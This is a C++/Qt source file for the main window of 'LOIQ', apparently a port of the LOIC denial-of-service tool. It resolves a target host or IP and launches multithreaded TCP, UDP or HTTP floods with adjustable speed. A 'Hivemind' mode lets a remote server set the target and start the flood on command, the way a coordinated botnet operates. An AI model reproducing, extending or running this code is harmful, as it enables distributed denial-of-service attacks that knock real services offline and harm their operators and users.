#include "main_window.h"


main_window::main_window(QWidget *parent) : QMainWindow(parent)
{
	setupUi(this);
	active = false;
	synapse_active = false;

	connect (Fire, SIGNAL(clicked()),  this, SLOT(start_flooding()));
	connect (SynapseConnect, SIGNAL(clicked()),  this, SLOT(activate_synapse()));
	connect (LockOn1, SIGNAL(clicked()), this, SLOT(set_target_by_URL()));
	connect (LockOn2, SIGNAL(clicked()), this, SLOT(set_target_by_IP()));
	connect (Speed_Slider, SIGNAL(valueChanged(int)), this, SLOT(change_speed(int)));
	Permalabel = new QLabel;
	statusbar->addPermanentWidget(Permalabel);
}

//
// Set the target parameters from the given URL. If the URL is not just a hostname,
// extract the relevant information (ip, port, etc) and fill the respective fields with it.
//
void main_window::set_target_by_URL()
{
	if (!URL_field->displayText().isEmpty()) {
		QString tmp = URL_field->displayText();

		// Try to split the URL in corresponding parts: host, port and subsite:

		QString protocol = "";
		QString hostname = "";
		QString port = "";
		QString subsite = "";

		if (tmp.contains( QRegExp("https?://", Qt::CaseInsensitive) ) ) {
			protocol = "HTTP";
			tmp.remove( QRegExp("https?://", Qt::CaseInsensitive) );
		}

		if (tmp.contains(":")) {
			hostname = tmp.mid (0, tmp.indexOf(":"));
			port = tmp.mid (tmp.indexOf(":") + 1, tmp.indexOf("/") - tmp.indexOf(":") - 1);
		} 
		if (tmp.contains("/")) {
			subsite = tmp.mid (tmp.indexOf("/"), tmp.length());
		}
		if (hostname.isEmpty()) {
			hostname = tmp;
		}

 		QHostInfo info = QHostInfo::fromName(hostname);

		// If the host can be resolved, set the corresponding fields according to the
		// information extracted previously from the URL.
		if (info.error() == QHostInfo::NoError ) {

			QHostAddress addr = info.addresses().first();
			IP_field->setText(addr.toString());
  			Target_field->setText(IP_field->displayText());
			if (!port.isEmpty()) {
				Port_field->setText(port);
			}
			if (!subsite.isEmpty()){
				HTTP_subsite_field->setText(subsite);
			}
			if (!protocol.isEmpty()){
				Method_field->setCurrentIndex(2);
			} 

		} else {
			
			statusbar->showMessage(tr("ERROR: cannot resolve URL!"), STATUSBAR_TIMEOUT);	
		}
	} else {

		statusbar->showMessage(tr("ERROR: No URL provided!"), STATUSBAR_TIMEOUT);
		
	}
}
	
//
// Set the target by IP. IP address can be either IP alone or IP:Port
//
void main_window::set_target_by_IP()
{
	if (!IP_field->displayText().isEmpty()) {

		if ( IP_field->displayText().contains(QRegExp ("\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}",  Qt::CaseInsensitive) ) ) {
			QString tmp = IP_field->displayText();

			if (tmp.contains(":")) {
				QString port = "";
				QString ip_addr = "";
				ip_addr = tmp.mid (0, tmp.indexOf(":"));
				port = tmp.mid (tmp.indexOf(":") + 1, tmp.indexOf("/") - tmp.indexOf(":") - 1);
				Target_field->setText(ip_addr);
				Port_field->setText(port);
			} else {
				Target_field->setText(tmp);
			}

		} else {
			statusbar->showMessage(tr("ERROR: Incorrect IP Address!"), STATUSBAR_TIMEOUT);
		}
	} else {
		statusbar->showMessage(tr("ERROR: No IP address provided!"), STATUSBAR_TIMEOUT);
	}
}


void main_window::activate_synapse()
{

	QHostInfo info = QHostInfo::fromName(SynapseServer->displayText());
	if (info.error() != QHostInfo::NoError ) {
		statusbar->showMessage(tr("ERROR: cannot resolve URL for Synapse!"), STATUSBAR_TIMEOUT);	
		return;
	}

	if (not synapse_active) {
		Synapse = new synapse (
			SynapseServer->displayText(),
			SynapsePort->displayText().toInt(),
			SynapseChannel->displayText()
			);
		Synapse->setParent(this);
		SynapseConnect->setText(tr("Disconnect"));
		Permalabel->setText(tr("<b>All your LOIQ are belong to Hivemind</b>"));
 		Synapse->run();
		synapse_active = true;
	} else {
		synapse_abort();
		Synapse->stop();
		SynapseConnect->setText(tr("Connect"));
		Permalabel->clear();
		synapse_active = false;
	}
}

void  main_window::synapse_set_ip(QString ip)
{
	statusbar->showMessage(ip, STATUSBAR_TIMEOUT);
	IP_field->setText(ip);
	set_target_by_IP();
}

void main_window::synapse_set_host(QString host)
{
	statusbar->showMessage(host, STATUSBAR_TIMEOUT);
	URL_field->setText(host);
	set_target_by_URL();
}
void main_window::synapse_set_port(quint32 port)
{
	statusbar->showMessage(QVariant(port).toString(), STATUSBAR_TIMEOUT);
	Port_field->setText(QVariant(port).toString());
}
void main_window::synapse_set_message(QString message)
{
	statusbar->showMessage(message, STATUSBAR_TIMEOUT);
	TCP_UDP_Message_field->setText(message);
}
void main_window::synapse_set_method(QString protocol)
{
	statusbar->showMessage(protocol, STATUSBAR_TIMEOUT);
	if (protocol == "TCP") {
		Method_field->setCurrentIndex(0);
	} else if (protocol == "UDP") {	
		Method_field->setCurrentIndex(1);
	} else if (protocol == "HTTP") {
		Method_field->setCurrentIndex(2);
	} else {
		statusbar->showMessage(tr("No such proto"), STATUSBAR_TIMEOUT);
	}
}
void main_window::synapse_set_subsite(QString subsite)
{
	statusbar->showMessage(subsite, STATUSBAR_TIMEOUT);
	HTTP_subsite_field->setText(subsite);
}
void main_window::synapse_obey()
{
	if (not active) {
		statusbar->showMessage(tr("Obeying the Hivemind orders"), STATUSBAR_TIMEOUT);
		start_flooding();
	} else {
		start_flooding(); // stop
		start_flooding();	//restart
	}
}

void main_window::synapse_abort()
{
	if (active) {
		statusbar->showMessage(tr("Aborting synchronisation with Hivemind"), STATUSBAR_TIMEOUT);
		start_flooding();
		Permalabel->clear();
	}
}

//
// Initialize packet generator
//
void main_window::start_flooding() 
{
	if (active) {
		killTimer(timer);
		statusbar->clearMessage();
		statusbar->showMessage(tr("Stopping the flood..."), STATUSBAR_TIMEOUT);
		Fire->setText(tr("IMMAH CHARGIN MAH LAZOR"));
		this->setWindowTitle(tr("LOIQ"));

 		for (qint32 i = 0; i < Threads_field->displayText().toInt(); i++) {
			if (Protocol == "HTTP") {
				httpflooder *fld_h = threads_h.back();
				fld_h->stop();
 				fld_h->wait();
				delete fld_h;
				threads_h.pop_back();
			} else {
				xppflooder *fld = threads.back();
 				fld->stop();
 				fld->wait();
				delete fld;
				threads.pop_back();
			}
			

 		}

		statusbar->clearMessage();
		statusbar->showMessage(tr("Stopped"), STATUSBAR_TIMEOUT);
		Target_field->setText(tr("NONE!"));
		active = false;

	} else {

		if (IP_field->displayText().isEmpty()) {
			statusbar->showMessage(tr("ERROR: No target selected!"), STATUSBAR_TIMEOUT);
			return;
		}
		clear_stats();
		floodcount = 0;
		Target_field->setText(IP_field->displayText());
		
		for (qint32 i = 0; i < Threads_field->displayText().toInt(); i++) {

			if (Method_field->currentText() == "HTTP") {
 				threads_h.push_back(new httpflooder (
					Target_field->displayText(),
					Port_field->displayText().toInt(),
					Method_field->currentText(), 
					Speed_Slider->value(), 
					Timeout_field->displayText().toInt(), 
					Wait_for_reply_box->isChecked(), 
					HTTP_subsite_field->displayText()
				));
				threads_h.at(i)->setParent(this);
				threads_h.at(i)->start();
			} else {
				threads.push_back(new xppflooder (
					Target_field->displayText(), 
					Port_field->displayText().toInt(),
					Method_field->currentText(), 
					Speed_Slider->value(), 
					Timeout_field->displayText().toInt(), 
					Wait_for_reply_box->isChecked(), 
					TCP_UDP_Message_field->displayText()
				));
				threads.at(i)->setParent(this);
				threads.at(i)->start();
			}
		}


		Fire->setText(tr("ABORT"));
		this->setWindowTitle(tr("LOIQ [Running]"));
		Protocol = Method_field->currentText();
		statusbar->clearMessage();
		active = true;
		active_time = 0;
		timer = startTimer(POLLING_FREQ);

		}
  	

}

//
// Request current status from the threads in a timely fashion
// Display the informaton in the Attack Status table
//
void main_window::timerEvent(QTimerEvent *event)
{
	Requested = 0;
	Failed = 0;
	Downloaded = 0;
	Status_idle = 0;
	Status_connecting = 0;
	Status_requesting = 0;
	Status_downloading = 0;
	for (qint32 i = 0; i < Threads_field->displayText().toInt(); i++) {
			if (Protocol == "HTTP") {
				httpflooder *fld_h = threads_h.back();
				Requested+= fld_h->Requested;
				Failed+= fld_h->Failed;
				Downloaded+= fld_h->Downloaded;
				switch(fld_h->Status){
					case idle:
						Status_idle++;
						break;
					case connecting:
						Status_connecting++;
					 	break;
					case requesting:
						Status_requesting++;
						break;
					case downloading:
						Status_downloading++;
						break;
				}	
       
			} else {
				xppflooder *fld_x = threads.back();
 				Requested+= fld_x->FloodCount;
				Failed+=  fld_x->Failed;
			}
	}
	label_requested->setText(QString::number(Requested));
	label_failed->setText(QString::number(Failed));
	label_downloaded->setText(QString::number(Downloaded));
	
	label_idle->setText(QString::number(Status_idle));
	label_connecting->setText(QString::number(Status_connecting));
	label_requesting->setText(QString::number(Status_requesting));
	label_downloading->setText(QString::number(Status_downloading));

	active_time+=POLLING_FREQ;
 	statusbar->showMessage(tr("Performance: ") +  QString::number( floodcount / ((double)active_time / 1000) ) + tr(" hits/sec") , 999);
	floodcount = Requested;

}

//
// Reset the Attack Status table
//
void main_window::clear_stats() 
{
	label_idle->clear();
	label_connecting->clear();
	label_requesting->clear();
	label_downloading->clear();
	label_downloaded->clear();
	label_requested->clear();
	label_failed->clear();
}

//
// Update the timeouts upon moving of Speed slider
//
void main_window::change_speed(int value)
{
	if (!active) {
		return;
	}
	for (qint32 i = 0; i < Threads_field->displayText().toInt(); i++) {
			if (Method_field->currentText() == "HTTP") {
				httpflooder *fld_h = threads_h.back();
				fld_h->Delay = value;
			} else {
				xppflooder *fld_x = threads.back();
 				fld_x->Delay = value;
			}
	}
}

